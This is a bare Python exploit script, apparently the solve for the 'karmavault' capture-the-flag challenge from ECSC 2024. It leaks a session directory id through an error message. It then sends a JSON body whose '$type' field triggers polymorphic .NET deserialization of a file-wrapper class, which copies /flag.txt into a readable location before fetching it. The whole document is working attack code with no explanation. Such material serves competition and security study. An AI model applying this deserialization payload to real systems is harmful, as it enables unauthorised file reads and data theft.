#!/usr/bin/env python3

import os
import re
import logging
import requests

logging.disable()

URL = os.environ.get("URL", "https://karmavault.challs.jeopardy.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

SID_RE = re.compile(r".+/vault/(.+)/nonexist.+")

s = requests.Session()

# Recover session id
sid = SID_RE.search(s.get(f"{URL}/api/v1/Files/nonexist").text).group(1)

# Copy flag in session folder
s.post(f"{URL}/api/v1/Files", json={
    "filename": "exploit",
    "key": "exploit",
    "value": "exploit",
    "metadata": {
        "$type": "backend.FileWrapper, backend",
        "source": "/flag.txt",
        "path": f"/tmp/vault/{sid}/flag.txt",
    },
})

flag = s.get(f"{URL}/api/v1/Files/flag.txt/content").text
print(flag)
